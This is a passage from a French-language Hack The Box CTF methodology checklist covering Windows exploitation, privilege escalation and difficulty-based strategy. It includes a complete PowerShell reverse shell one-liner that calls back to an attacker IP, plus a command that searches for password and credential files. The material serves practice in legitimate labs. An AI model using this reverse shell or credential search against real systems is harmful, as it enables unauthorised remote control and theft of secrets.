  > *Question*: Y a-t-il des applications métier personnalisées installées qui pourraient avoir des vulnérabilités?

- [ ] **Exploitation spécifique à Windows**
  
  L'exploitation des machines Windows dans les CTF repose souvent sur des services mal configurés, des applications vulnérables ou des problèmes de gestion des privilèges. Contrairement à Linux, obtenir un shell initial peut être plus complexe et nécessiter des outils spécifiques comme PowerShell Empire, Covenant ou Metasploit.
  
  Les shells Windows sont généralement moins stables que leurs homologues Linux. Privilégiez les shells PowerShell ou meterpreter pour une meilleure stabilité et fonctionnalité. N'oubliez pas que PowerShell peut être restreint par des politiques d'exécution, mais celles-ci peuvent souvent être contournées.
  
  ```powershell
  # Exemple de reverse shell PowerShell
  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.X',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  ```
  
  > *Question*: PowerShell est-il disponible et quelles sont les restrictions d'exécution en place?

- [ ] **Post-exploitation spécifique à Windows**
  
  L'élévation de privilèges sur Windows dans les CTF suit des modèles différents de Linux. Concentrez-vous sur les services mal configurés, les problèmes de permissions de fichiers, les vulnérabilités de type AlwaysInstallElevated, et les privilèges spéciaux comme SeImpersonatePrivilege qui peuvent être exploités avec des outils comme JuicyPotato ou PrintSpoofer.
  
  Les CTF Windows comportent souvent des indices dans le registre, les fichiers de configuration d'applications ou les documents utilisateur. Examinez toujours `C:\Users\<username>\Documents\`, `C:\Users\<username>\Desktop\` et les fichiers de configuration dans `C:\Program Files\` et `C:\Program Files (x86)\`.
  
  ```powershell
  # Vérifier les privilèges de l'utilisateur actuel
  whoami /priv
  
  # Rechercher des fichiers sensibles
  dir /s /b *pass*.txt *cred*.txt *vnc*.ini *.config 2>nul
  ```
  
  > *Question*: L'utilisateur actuel a-t-il des privilèges spéciaux comme SeImpersonate ou SeDebug qui peuvent être exploités?

### Adaptations selon le niveau de difficulté

- [ ] **Machines faciles (Easy)**
  
  Les machines faciles sur Hack The Box suivent généralement un chemin linéaire avec des vulnérabilités évidentes. Elles comportent souvent une seule vulnérabilité majeure pour l'accès initial et une méthode simple d'élévation de privilèges. Pour ces machines, concentrez-vous sur:
  
  - Les services web avec des vulnérabilités connues ou des CMS obsolètes
  - Les identifiants par défaut ou faibles
  - Les exploits publics sans modification nécessaire
  - Les méthodes d'élévation de privilèges évidentes (SUID, sudo mal configuré)
  
  > *Question*: La vulnérabilité est-elle évidente et documentée publiquement?

- [ ] **Machines moyennes (Medium)**
  
  Les machines de difficulté moyenne nécessitent généralement une combinaison de vulnérabilités ou des modifications d'exploits existants. Elles peuvent comporter des rabbit holes intentionnels pour distraire les joueurs. Pour ces machines:
  
  - Soyez méthodique dans votre énumération et documentez tout
  - Cherchez des vulnérabilités qui nécessitent une chaîne d'exploitation
  - Attendez-vous à devoir modifier légèrement des exploits publics
  - Examinez attentivement les permissions et les configurations
  
  > *Question*: Y a-t-il une chaîne de vulnérabilités à exploiter plutôt qu'une seule faille évidente?

- [ ] **Machines difficiles (Hard/Insane)**
  
  Les machines difficiles sur HTB sont conçues pour tester des compétences avancées et peuvent nécessiter des exploits personnalisés, des techniques de fuzzing approfondies ou des connaissances spécialisées. Pour ces machines:
  
  - Attendez-vous à des vulnérabilités non documentées ou des zero-days
  - Préparez-vous à développer des exploits personnalisés
  - L'énumération doit être exhaustive et couvrir des services ou ports inhabituels
  - Les techniques d'élévation de privilèges peuvent nécessiter des connaissances approfondies du système
  
  > *Question*: La vulnérabilité nécessite-t-elle une analyse approfondie du code ou un développement d'exploit personnalisé?

### Conseils généraux d'adaptation

Quelle que soit la machine, adaptez votre approche en fonction des premiers résultats:

1. **Adaptez vos outils**: Utilisez des outils spécifiques à la plateforme identifiée. Par exemple, BloodHound pour les environnements Active Directory, même sur une machine standalone.

2. **Ajustez votre méthodologie**: Sur Linux, commencez par les services web et SSH; sur Windows, privilégiez SMB, RDP et les services web IIS.

3. **Soyez attentif aux indices**: Le nom de la machine, sa description ou ses tags peuvent contenir des indices sur la vulnérabilité principale.

4. **Reconnaissez les rabbit holes**: Si une piste ne mène nulle part après un temps raisonnable, n'hésitez pas à revenir en arrière et explorer d'autres voies.

5. **Documentez tout**: Prenez des notes détaillées sur chaque découverte, même celles qui semblent insignifiantes. Dans les machines complexes, des informations apparemment anodines peuvent se révéler cruciales plus tard.

## 6. Conclusion et ressources

### Stratégie globale
Cette checklist a été conçue comme un processus décisionnel évolutif pour résoudre des machines CTF sur Hack The Box. Elle n'est pas figée et doit être adaptée en fonction des spécificités de chaque machine. L'approche méthodique proposée vous permettra d'éviter les erreurs courantes et d'optimiser votre temps lors de la résolution des challenges.

### Points clés à retenir

- **Méthodologie avant outils**: Suivez une approche structurée plutôt que de vous précipiter sur des outils spécifiques. La méthodologie vous guidera vers les bons outils au bon moment.

- **Documentation continue**: Documentez chaque découverte, chaque tentative et chaque résultat. Cette documentation est essentielle pour éviter les répétitions inutiles et pour identifier des motifs qui pourraient passer inaperçus.

- **Adaptabilité**: Adaptez votre approche en fonction du système d'exploitation, du niveau de difficulté et des services découverts. Une approche rigide limitera votre efficacité.

- **Patience et persévérance**: Les machines CTF sont conçues pour être des défis. Ne vous découragez pas si vous ne progressez pas immédiatement. Revenez aux bases et réexaminez vos découvertes.

- **Apprentissage continu**: Chaque machine est une opportunité d'apprentissage. Après avoir résolu une machine, consultez les write-ups d'autres joueurs pour découvrir des approches alternatives.

### Ressources recommandées

- **Sites de référence**:
  - [HackTricks](https://book.hacktricks.xyz/) - Guide complet de techniques de hacking
  - [GTFOBins](https://gtfobins.github.io/) - Pour l'élévation de privilèges sur Linux
  - [LOLBAS](https://lolbas-project.github.io/) - Pour l'élévation de privilèges sur Windows
  - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Collection de payloads et de techniques de contournement

- **Outils essentiels**:
  - [Kali Linux](https://www.kali.org/) - Distribution Linux orientée sécurité
  - [Burp Suite](https://portswigger.net/burp) - Pour le test d'applications web
  - [Metasploit Framework](https://www.metasploit.com/) - Pour l'exploitation
  - [PEASS-ng](https://github.com/carlospolop/PEASS-ng) - Scripts d'énumération pour Linux et Windows

- **Formations et pratique**:
  - [TryHackMe](https://tryhackme.com/) - Pour les débutants et intermédiaires
  - [VulnHub](https://www.vulnhub.com/) - Machines virtuelles vulnérables
  - [OverTheWire](https://overthewire.org/wargames/) - Wargames pour pratiquer

### Mot de la fin

Cette checklist est un point de départ qui doit évoluer avec votre expérience. N'hésitez pas à la personnaliser en fonction de vos préférences et des leçons que vous apprendrez en résolvant des machines. La cybersécurité est un domaine en constante évolution, et votre méthodologie doit évoluer avec lui.

Bonne chance dans vos futures conquêtes sur Hack The Box!
